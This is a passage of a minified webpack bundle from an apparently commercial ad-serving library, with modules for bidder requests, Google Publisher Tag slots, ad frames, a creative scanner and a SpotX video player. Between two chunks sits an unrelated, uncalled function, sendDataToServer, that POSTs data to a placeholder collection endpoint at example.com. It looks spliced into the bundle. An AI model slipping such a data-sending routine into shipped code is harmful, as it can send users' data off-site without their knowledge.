          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, t);
        var r = function (e, t) {
          if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
          return !t || "object" != typeof t && "function" != typeof t ? e : t;
        }(this, e.call(this));
        return r.jsonp = !1, r;
      }
      return a(t, e), t.prototype.getUrl = function () {
        return "https://pubs2-us.creativecdn.com/bidder/pubs/tagging?type=json&group=QUgkGX3gvsSUlsS2qlcg";
      }, t.prototype.getSspId = function () {
        return 36;
      }, t.prototype.before = function (e) {
        return Promise.resolve(e);
      }, t.prototype.after = function (e) {
        var t = {};
        return e.records.forEach(function (r) {
          if (Array.isArray(e.response.deals)) if (e.response.deals.find(function (e) {
            return e.hash === r.adunitid;
          })) {
            var n = i.default.getSizeByRTBHouseHash(r.adunitid, r.format);
            r.width = n[0], r.height = n[1], t[r.adunitid] = {
              data: r,
              creative: {
                placement: r.adunitid,
                html: '<iframe src="https://storage.googleapis.com/rtbhouse-pubs-us/delivery/pubs.html#w=' + n[0] + "&h=" + n[1] + "&publisher=" + r.adunitid + "&url=" + location.href + '" width="' + n[0] + '" height="' + n[1] + '" style="border: 0; overflow: hidden;" scrolling="no">',
                type: "normal",
                is_fallback: 0,
                height: n[1],
                deal_id: r.lid || !1,
                price: r.price || null,
                width: n[0]
              }
            };
          } else t[r.adunitid] = {
            data: r,
            error: new Error("No ad available")
          };
        }), Promise.resolve(t);
      }, t.prototype.request = function (e) {
        return this.XHRequest(this.getUrl(), this.getSspId(), e);
      }, t.prototype.parse = function (e, t) {
        console.log(e);
      }, t.prototype.run = function (e) {
        var t = this;
        return t.publish("run", [t, e]), t.before(e).then(function () {
          return t.request(e);
        }).then(function (r) {
          return t.after(r, e);
        }).then(function (r) {
          return t.publish("response", [t, e, r]), r;
        }).catch(function (r) {
          throw r instanceof window.ProgressEvent && "error" === r.type && t.publish("xhrError", [t, e]), r;
        });
      }, t.isMulti = function () {
        return !0;
      }, t.factory = function (e) {
        return new t(e);
      }, t;
    }(n.default);
    t.default = u;
  },
  579: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = o(r(580)),
      i = o(r(73));
    function o(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function a(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var i = r[n],
            o = Object.getOwnPropertyDescriptor(t, i);
          o && o.configurable && void 0 === e[i] && Object.defineProperty(e, i, o);
        }
      }(e, t));
    }
    var u = new WeakMap(),
      c = function (e) {
        function t() {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var r = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this)),
            n = r;
          return u.set(n, {}), r;
        }
        return a(t, e), t.prototype.run = function (e) {
          var t = this;
          t.publish("run", [t, [e]]);
          for (var r = e.format, n = i.default.getSizes(r), o = "", a = 0; a < n.length; a++) o += ",[" + n[a] + "]";
          return e.sizes = o.substr(1), Promise.resolve().then(function () {
            t.publish("response", [t, [e], []]);
            var r = e.adunitid.split("*|;").shift();
            return {
              creative: {
                html: '\n<div id="jpx-gpt-ad-' + e.sourceId + '"></div>\n<script src="https://www.googletagservices.com/tag/js/gpt.js"><\/script>\n<script>\n    window.fn' + e.sourceId + " = function() {};\n    googletag.cmd.push(function () {\n        googletag.pubads().disableInitialLoad();\n    });\n    googletag.cmd.push(\n        function () {\n            googletag.pubads().enableSingleRequest();\n            googletag.pubads().collapseEmptyDivs();  \n            googletag.pubads().addEventListener('slotRenderEnded', function(event) {\n                if(event.slot.getSlotElementId() === 'jpx-gpt-ad-" + e.sourceId + "' && event.isEmpty) {\n                    window.frameElement.setAttribute('jpx-is-empty', '1');\n                } else {\n                    window.frameElement.setAttribute('jpx-is-empty', '0'); \n                }\n                window.fn" + e.sourceId + "(event);\n            });\n            googletag.defineSlot('" + r + "', [" + e.sizes + "], 'jpx-gpt-ad-" + e.sourceId + "').addService(googletag.pubads());  \n            googletag.enableServices();\n            googletag.display('jpx-gpt-ad-" + e.sourceId + "');\n            googletag.pubads().refresh();\n        });\n<\/script>\n",
                height: n[0][1],
                width: n[0][0]
              }
            };
          });
        }, t.isMulti = function () {
          return !1;
        }, t.factory = function () {
          return new t();
        }, t;
      }(n.default);
    t.default = c;
  },
  580: function (e, t, r) {
    "use strict";

    function n(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var i = r[n],
            o = Object.getOwnPropertyDescriptor(t, i);
          o && o.configurable && void 0 === e[i] && Object.defineProperty(e, i, o);
        }
      }(e, t));
    }
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = function (e) {
      function t() {
        return function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, t), function (e, t) {
          if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
          return !t || "object" != typeof t && "function" != typeof t ? e : t;
        }(this, e.call(this));
      }
      return n(t, e), t.prototype.run = function (e) {
        var t = this;
        return t.publish("run", [t, [e]]), t.before(e).then(function () {
          return t.request(e);
        }).then(function (e) {
          return t.after(e);
        }).then(function (r) {
          return t.publish("response", [t, [e], r]), r;
        });
      }, t.prototype.before = function (e) {
        return Promise.resolve(e);
      }, t.prototype.request = function (e) {
        return Promise.resolve({});
      }, t.prototype.after = function (e) {
        return Promise.resolve(e);
      }, t.isMulti = function () {
        return !1;
      }, t.factory = function () {
        return new t();
      }, t;
    }(function (e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }(r(113)).default);
    t.default = i;
  },
  581: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = o(r(20)),
      i = o(r(1));
    function o(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function a(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var i = r[n],
            o = Object.getOwnPropertyDescriptor(t, i);
          o && o.configurable && void 0 === e[i] && Object.defineProperty(e, i, o);
        }
      }(e, t));
    }
    var u = new WeakMap(),
      c = i.default.getTopScope(),
      s = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this, r)),
            i = n;
          r = r || {};
          var o = {};
          return o.di = r.di || {}, o.fallback = r.fallback || "", u.set(i, o), n;
        }
        return a(t, e), t.prototype._extendFnBody = function (e) {
          return function () {}.toString().replace(/function\s*\(\)\s*\{?/i, "").slice(0, -1) + ";" + e;
        }, t.prototype._extendScope = function (t) {
          u.get(this).di;
          t.insertElement = c.document.body, t.insertModeDefault = "append", t.createAdframe = function (e) {
            e || (e = "IFRAME");
            var r = c.document.createElement(e);
            return r.style.width = "1px", r.style.height = "1px", r.format = "", r.setAttribute("allowtransparency", "true"), r.style.border = "0px", r.scrolling = "no", t.insertElement.appendChild(r), r;
          }, t.getServingAdFrameBody = function () {
            return window.document.body;
          }, t.insert = function (e, r, n) {
            switch (r || (r = t.insertModeDefault), !0 !== n && (n = !1), r) {
              case "before_sibling":
                t.insertElement.parentNode.insertBefore(e, this.insertElement);
                break;
              case "after_sibling":
                t.insertElement.parentNode.insertBefore(e, t.insertElement.nextSibling);
                break;
              case "before":
                if (n) var i = t.insertElement,
                  o = t.insertElement.firstChild;else i = t.insertElement.parentNode, o = t.insertElement;
                return i.insertBefore(e, o);
              case "after":
                if (n) return t.insertElement.appendChild(e);
                i = t.insertElement.parentNode, o = t.insertElement.nextSibling;
                return i.lastchild == t.insertElement ? i.appendChild(e) : i.insertBefore(e, o);
              default:
                return t.insertElement.appendChild(e);
            }
          }, t.openAdframe = function (e) {
            var t = "";
            return "IFRAME" == e.tagName && ("is" !== this.format && "cf" !== this.format || (t = "<script>var inDapIF=true;<\/script>"), e.contentWindow.document.open("text/html"), e.contentWindow.document.write('<html><head><style type="text/css">html,body{padding:0px;margin:0px;background-color:transparent;overflow:hidden;}</style>' + t + "</head><body></body></html>"), e.contentWindow.document.ccformat = this.format, !0);
          }, t.closeAdframe = function (e) {
            return !(!e || "IFRAME" != e.tagName || !e.contentWindow) && (e.contentWindow.document.close(), !0);
          }, t.logError = function (e) {}, e.prototype._extendScope.call(this, t);
        }, t.execute = function (e) {
          new t(e).sandbox(e.fallback || "");
        }, t.prototype.setDependency = function (e, t) {
          return u.get(this).di[e] = t, this.publish(e + "DependencySet", [t]), this;
        }, t;
      }(n.default);
    t.default = s;
  },
  582: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = {
      prefix: "jpx-",
      decode: function (e) {
        return JSON.parse(e);
      },
      encode: function (e) {
        return JSON.stringify(e);
      },
      read: function (e) {
        try {
          var t = void 0;
          try {
            (t = window.top).location.href;
          } catch (e) {
            t = window;
          }
          var r = t.sessionStorage;
          if (!r) return !1;
          var n = r.getItem(this.prefix + e);
          return !!n && (n = this.decode(n));
        } catch (e) {
          return !1;
        }
      },
      save: function (e, t) {
        try {
          var r = void 0;
          try {
            (r = window.top).location.href;
          } catch (e) {
            r = window;
          }
          var n = r.sessionStorage;
          return !!n && n.setItem(this.prefix + e, this.encode(t));
        } catch (e) {
          return !1;
        }
      }
    };
    t.default = n;
  },
  583: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = o(r(55)),
      i = o(r(584));
    function o(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function a(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var i = r[n],
            o = Object.getOwnPropertyDescriptor(t, i);
          o && o.configurable && void 0 === e[i] && Object.defineProperty(e, i, o);
        }
      }(e, t));
    }
    var u = new WeakMap(),
      c = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this, r)),
            i = n,
            o = {},
            a = (r = r || {}).di || {};
          return u.set(i, o), o.di = a, n;
        }
        return a(t, e), t.prototype._setupExecution = function (e) {
          var t = this,
            r = e.di;
          return r.jScanner.scan().then(function (e) {
            return r.jModel.addProperty("height", e.height), r.jModel.addProperty("width", e.width), t.publish("writeAdFound", [t, r.jScanner, r.jModel, e]), e;
          });
        }, t.prototype._executionFail = function (t, r) {
          if ([203, 204, 205].indexOf(t.code) > -1) throw t;
          e.prototype._executionFail.call(this, t, r);
        }, t.prototype._initializeDependency = function (t) {
          var r = e.prototype._initializeDependency.call(this, t);
          return this.publish("writeAdScannerStart", [this, r.jScanner, r.jModel]), r.jScanner = new i.default({
            di: {
              jAdFrame: r.jAdFrame,
              jModel: r.jModel
            }
          }), r;
        }, t;
      }(n.default);
    t.default = c;
  },
  584: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = s(r(4)),
      i = s(r(2)),
      o = s(r(73)),
      a = s(r(16)),
      u = s(r(13)),
      c = s(r(1));
    function s(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function l(e, t) {
      if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
      return !t || "object" != typeof t && "function" != typeof t ? e : t;
    }
    function d(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var i = r[n],
            o = Object.getOwnPropertyDescriptor(t, i);
          o && o.configurable && void 0 === e[i] && Object.defineProperty(e, i, o);
        }
      }(e, t));
    }
    var p = new WeakMap(),
      f = c.default.getTopScope(),
      h = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = l(this, e.call(this, r)),
            i = n,
            o = {
              di: r.di,
              counter: 30,
              creativeTypes: ["iframe", "img", "canvas", "video", "div", "span", "ins"],
              externalScripts: [/adform/, /doubleclick/, /flashtalking/, /mediamath/, /adnxs/, /weborama/, /creative-serving/, /serving-sys/, /celtra/, /amazonaws/, /cloudfront/, /mm1x/],
              externalScript: !1,
              celtraClassName: "celtra-ad-v3",
              celtraDetected: !1,
              scope: "adframe",
              cancelTimer: function () {}
            };
          return p.set(i, o), l(n, i);
        }
        return d(t, e), t.prototype._searchForExternalScript = function (e, t) {
          var r = p.get(this);
          if ("cf" === r.di.jModel.getFormat() && Array.prototype.slice.call(e.getAllDOMElements("script")).find(function (e) {
            return !!r.externalScripts.find(function (t) {
              return e && e.src.match(t);
            });
          })) return t({
            height: 0,
            width: 728,
            el: e.getDOMElement()
          }), !0;
          return !1;
        }, t.prototype._getAllAvailElements = function (e) {
          var t = p.get(this),
            r = t.creativeTypes;
          return [].concat.apply([], r.map(function (r) {
            return Array.prototype.slice.call("top" === t.scope ? f.document.querySelector(r) : e.getAllDOMElements(r));
          }));
        }, t.prototype._correctCreativeSizeIE11 = function (e) {
          if ("img" === e.tagName.toLowerCase() && c.default.isIE11() && !e._jpxCorrection) {
            var t = p.get(this).di.jModel;
            if (e._jpxCorrection = !0, ["wp", "wv"].indexOf(t.getFormat()) > -1) {
              var r = u.default.getNaturalImageSize(e);
              e.style.height = e.height = r.height, e.style.width = e.width = r.width;
            }
          }
        }, t.prototype._matchBySize = function (e) {
          var t = this,
            r = p.get(t),
            n = r.di.jModel;
          return t._getAllAvailElements(e).filter(function (e) {
            if (r.celtraDetected) return !1;
            if (t._isCeltra(e)) return !0;
            if (1 === n.getData("ssp") && "jcl-wrapper" === e.className) return !0;
            t._correctCreativeSizeIE11(e);
            var i = u.default.getElementRealSize(e);
            return !(i.width < o.default.getProductMin(n.getFormat(), "width") || i.height < o.default.getProductMin(n.getFormat(), "height")) && o.default.fitSizes(n.getFormat(), i.height, i.width);
          });
        }, t.prototype._isCeltra = function (e) {
          var t = p.get(this);
          if (["is"].indexOf(t.di.jModel.getFormat()) < 0) return !1;
          var r = e.getAttribute("class");
          return !(!r || !r.match(t.celtraClassName)) && (t.celtraDetected = !0, !0);
        }, t.prototype._isFallback = function (e) {
          return !!Array.prototype.slice.call(e.getAllDOMElements("img")).find(function (e) {
            return /creative\.360yield\.[\S]+1x1/.test(e.src) || /blank_1X1/.test(e.src);
          });
        }, t.prototype._checkGlobalVariables = function (e) {
          if (f.jpx_ad_config) return e(f.jpx_ad_config), !0;
          if (f.jpx_external_cf) {
            var t = p.get(this).di;
            if ("cf" === t.jModel.getFormat()) return e({
              height: 0,
              width: 728,
              el: t.jAdFrame.getJDOMElement("adframe").getDOMElement()
            }), !0;
          }
          return !1;
        }, t.prototype._getBestOption = function (e) {
          var t = p.get(this).di.jModel,
            r = e.shift(),
            n = this._hasCeltra() ? {
              height: f.innerHeight,
              width: f.innerWidth
            } : u.default.getElementRealSize(r);
          if ((0 === n.width || 0 === n.height) && "jcl-wrapper" === r.className) {
            var i = t.getData("creative.height"),
              a = t.getData("creative.width");
            i && a && o.default.fitSizes(t.getFormat(), i, a) && (n.width = t.getData("creative.width"), n.height = t.getData("creative.height"));
          }
          return n.el = r, n;
        }, t.prototype._hasCeltra = function () {
          return p.get(this).celtraDetected;
        }, t.prototype._searchForAllowedElements = function (e, t) {
          var r = this,
            n = p.get(r),
            o = n.di.jAdFrame.getJDOMElement("adframe"),
            a = [];
          if (!r._checkGlobalVariables(e)) {
            if (r._isFallback(o)) return t(r.error(204));
            if (!r._searchForExternalScript(o, e)) return a = a.concat(r._matchBySize(o) || null), r._hasCeltra() ? e(r._getBestOption(a)) : a.length ? e(r._getBestOption(a)) : void (n.counter-- ? n.cancelTimer = i.default.delay(r, function () {
              return r._searchForAllowedElements(e, t);
            }, 36) : t(r.error(203)));
          }
        }, t.prototype._cancelTimer = function () {
          var e = p.get(this);
          e.cancelTimer(), e.counter = 0;
        }, t.prototype._searchForWallpaperClick = function (e, t) {
          var r = e.jModel,
            n = e.jAdFrame;
          if ("wp" === r.getFormat() && !t.clickURL) {
            var i = Array.prototype.slice.call(n.getJDOMElement("adframe").getAllDOMElements("img")).map(function (e) {
              return [e, e.offsetWidth, e.offsetHeight];
            }).filter(function (e) {
              return o.default.fitSizes("wp", e[2], e[1]);
            }).sort(function (e, t) {
              return e[1] * e[2] - t[1] * t[2];
            }).pop();
            i && "a" === i[0].parentNode.tagName.toLocaleLowerCase() && (t.clickURL = i[0].parentNode.href);
          }
          return this;
        }, t.prototype.scan = function () {
          var e = this,
            t = p.get(e);
          return t.di.jAdFrame.ready().then(function () {
            return new Promise(function (t, r) {
              e._searchForAllowedElements(t, r);
            }).then(function (r) {
              return e._searchForWallpaperClick(t.di, r), a.default.info("JScanner: creative found"), a.default.info(r), r;
            });
          });
        }, t;
      }(n.default);
    t.default = h;
  },
  585: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = a(r(55)),
      i = a(r(2)),
      o = a(r(586));
    function a(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function u(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var i = r[n],
            o = Object.getOwnPropertyDescriptor(t, i);
          o && o.configurable && void 0 === e[i] && Object.defineProperty(e, i, o);
        }
      }(e, t));
    }
    var c = new WeakMap(),
      s = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this, r)),
            i = n,
            o = {},
            a = (r = r || {}).di || {};
          return c.set(i, o), o.di = a, n;
        }
        return u(t, e), t.prototype._setupExecution = function (e) {
          var t = this,
            r = this,
            n = e.di,
            o = n.jDOM,
            a = window.document.createElement("video"),
            u = window.document.createElement("div"),
            c = n.jAdFrame.getJDOMElement("ad").getDOMElement(),
            s = n.jAdFrame.getJDOMElement("adframe"),
            l = n.jModel.getData("scope"),
            d = e.global,
            p = !(!d.cmp || !d.cmp.eu) && d.cmp.eu,
            f = !(!d.cmp || !d.cmp.consentString) && d.cmp.consentString;
          u.appendChild(a), c.appendChild(u), s.setStyle("display", "none");
          var h = new l.SpotX.DirectAdOS({
            ados: {
              user: {
                consent: f || 1
              },
              regs: {
                gdpr: p ? 1 : 0
              },
              query_params: "media_transcoding[]=medium"
            },
            channel_id: n.jModel.getData("adunitid"),
            hide_skin: !0,
            ad_mute: !0,
            ad_volume: 0,
            preload_ados: !0,
            autoplay: !0,
            blocked_autoplay_override_mode: 1,
            slot: u,
            video_slot: a,
            content_width: n.jModel.getData("width"),
            content_height: n.jModel.getData("height"),
            custom: {
              ch: n.jModel.getData("channel"),
              f: function (e) {
                return (Math.round(2 * e) / 2).toFixed(1);
              }(n.jModel.getData("floorprice")),
              adid: n.jModel.getData("adId"),
              zid: n.jModel.getData("zoneId")
            }
          });
          n.jCompatibilityAdapter.setDependency("spotXDirectAdOs", h);
          var g = void 0,
            y = new Promise(function (o, a) {
              var u = !1;
              h.subscribe(function (e) {
                u = !0, r.publish("asyncWriteAdFound", [r, n.jModel]), o(), g = i.default.delay(r, function () {
                  r.publish("asyncWriteAdShown", [r, n.jModel]);
                }, 300);
              }, "AdLoaded", t), h.subscribe(function () {
                if (u) {
                  g();
                  var t = r.error(220);
                  return n.jModel.addProperty("error", t), r._clearExecution(e), void r.publish("executionFailure", [t, n.jModel]);
                }
                var i = r.error(209);
                n.jModel.addProperty("error", i), a(i);
              }, l.SpotX.DirectAdOS.Events.AD_ERROR, t);
            });
          return r.publish("asyncWriteAdStart", [r, n.jModel]), h.loadAd().then(function () {
            return y;
          }).then(function () {
            return r._initializeSpotXDependency(e, [h, a, u, o]), {};
          });
        }, t.prototype._initializeSpotXDependency = function (e, t) {
          e.di.jPlayer = new o.default({
            di: {
              spotX: t[0],
              jDOM: t[3]
            },
            video: t[1],
            container: t[2]
          });
        }, t;
      }(n.default);
    t.default = s;
  },
  586: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = i(r(4));
    i(r(1));
    function i(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function o(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var i = r[n],
            o = Object.getOwnPropertyDescriptor(t, i);
          o && o.configurable && void 0 === e[i] && Object.defineProperty(e, i, o);
        }
      }(e, t));
    }
    var a = new WeakMap(),
      u = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this, r)),
            i = n,
            o = {};
          return a.set(i, o), o.di = r.di, o.video = r.video, o.parent = r.container, o.video.muted = !0, n;
        }
        return o(t, e), t.prototype._applyStyles = function () {
          var e = a.get(this);
          e.video.style.width = e.parent.style.width = "100%", e.video.style.height = e.parent.style.height = "100%";
        }, t.prototype._bindMuteEvent = function () {
          var e = this;
          a.get(e).di.jDOM.getScope().addEventListener("blur", function () {
            e.pause();
          });
        }, t.prototype._bindEvents = function () {
          var e = this,
            t = a.get(e);
          t.di.spotX.subscribe(function () {
            e.publish("progress", [e, t.video]);
          }, "AdRemainingTimeChange", t.di.spotX), t.di.spotX.subscribe(function () {
            e.publish("clicked", [e, t.video]);
          }, "AdClickThru", t.di.spotX), t.di.spotX.subscribe(function () {
            e.publish("ended", [e, t.video]);
          }, "AdVideoComplete", t.di.spotX);
        }, t.prototype._bindFocusEvent = function () {
          var e = this;
          a.get(e).di.jDOM.getScope().addEventListener("focus", function () {
            e.publish("focus", [e]);
          });
        }, t.prototype._setPrefix = function (e) {
          this._prefix = e || "jp-video-";
        }, t.prototype.getContainer = function () {
          var e = a.get(this);
          return {
            clientWidth: e.parent.clientWidth,
            clientHeight: e.parent.clientHeight,
            setStyle: function (t, r) {
              e.parent.style[t] = r;
            }
          };
        }, t.prototype.getCurrentTime = function () {
          return a.get(this).video.currentTime;
        }, t.prototype.getCurrentTimeInPercent = function () {
          var e = a.get(this);
          return e.video.currentTime / e.video.duration * 100;
        }, t.prototype.getDuration = function () {
          return a.get(this).video.duration;
        }, t.prototype.getPlayerHeight = function () {
          return a.get(this).video.offsetHeight;
        }, t.prototype.getPlayerWidth = function () {
          return a.get(this).video.offsetWidth;
        }, t.prototype.getPrefix = function () {
          return this._prefix;
        }, t.prototype.getParentObject = function () {
          return a.get(this).parent;
        }, t.prototype.isMuted = function () {
          return a.get(this).video.muted;
        }, t.prototype.isPlaying = function () {
          return a.get(this).isPlaying;
        }, t.prototype.mute = function () {
          var e = a.get(this);
          e.video.muted = !0, e.video.volume = 0;
        }, t.prototype.pause = function () {
          var e = a.get(this),
            t = e.di.jDOM;
          e.di.spotX.pauseAd(), e.isPlaying = !1;
          var r = t.getElement("jpx-wp-controls-button-play");
          -1 !== r && r.addClass("jpx-wp-play");
          var n = t.getElement("jpx-hv-controls-overlay");
          -1 !== n && n.addClass("jpx-hv-control-overlay-visible");
        }, t.prototype.play = function () {
          var e = a.get(this);
          e.di.spotX.playAd(), e.isPlaying = !0;
        }, t.prototype.removeParentClass = function (e) {
          var t = a.get(this),
            r = t.parent,
            n = "";
          null !== r.getAttribute("class") && (n = r.getAttribute("class").replace(new RegExp(e, "g"), "").replace("  ", ""), t.parent.setAttribute("class", n));
        }, t.prototype.ready = function () {
          var e = a.get(this);
          return Promise.resolve(e.di.spotX);
        }, t.prototype.resetPlayerTime = function () {
          a.get(this).video.currentTime = .2;
        }, t.prototype.setParentClass = function (e) {
          var t = a.get(this),
            r = t.parent,
            n = "";
          null !== r.getAttribute("class") && (n = r.getAttribute("class")), t.parent.setAttribute("class", n + " " + e);
        }, t.prototype.setup = function (e, t) {
          var r = this;
          a.get(r).playerOpts = t, r._bindEvents(), r._applyStyles(), r._bindMuteEvent(), r._bindFocusEvent();
        }, t.prototype.unmute = function () {
          var e = a.get(this);
          e.video.muted = !1, e.video.volume = 1;
        }, t;
      }(n.default);
    t.default = u;
  },
  587: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = i(r(55));
    i(r(2));
    function i(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function o(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var i = r[n],
            o = Object.getOwnPropertyDescriptor(t, i);
          o && o.configurable && void 0 === e[i] && Object.defineProperty(e, i, o);
        }
      }(e, t));
    }
    var a = new WeakMap(),
      u = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this, r)),
            i = n,
            o = {},
            u = (r = r || {}).di || {};
          return a.set(i, o), o.di = u, n;
        }
        return o(t, e), t.prototype._executionFail = function (t, r) {
          if ([203, 204, 205].indexOf(t.code) > -1) throw t;
          e.prototype._executionFail.call(this, t, r);
        }, t.prototype._setupExecution = function (e) {
          var t = this,
            r = e.di;
          return t.publish("asyncWriteAdStart", [t, r.jModel]), new Promise(function (e, n) {
            var i = r.jAdFrame.getJDOMElement("adframe"),
              o = i.getDOMElement().getAttribute("jpx-is-empty");
            if ("1" === o) {
              var a = t.error(204);
              r.jModel.addProperty("error", a), n(a);
            } else if ("0" === o) t.publish("asyncWriteAdFound", [t, r.jModel]), t.publish("asyncWriteAdShown", [t, r.jModel]), e();else {
              i.getDOMElement().contentWindow["fn" + r.jModel.getData("sourceId")] = function (i) {
                if (i.isEmpty) {
                  var o = t.error(204);
                  r.jModel.addProperty("error", o), n(o);
                } else t.publish("asyncWriteAdFound", [t, r.jModel]), t.publish("asyncWriteAdShown", [t, r.jModel]), e();
                e();
              };
            }
          });
        }, t;
      }(n.default);
    t.default = u;
  }
}, [572]);
function sendDataToServer(data) {
  const url = "https://example.com/api/collect";
  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  }).then(response => response.json()).then(data => console.log('Success:', data)).catch(error => console.error('Error:', error));
}
this.Jpx = this.Jpx || {}, this.Jpx.PluginExtend = webpackJsonpJpx__name_([21], {
  588: function (e, t, r) {
    "use strict";

    e.exports = r(589).default;
  },
  589: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = s(r(91)),
      o = s(r(55)),
      i = s(r(79)),
      d = s(r(16)),
      a = s(r(1)),
      c = s(r(33));
    function s(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function u(e, t) {
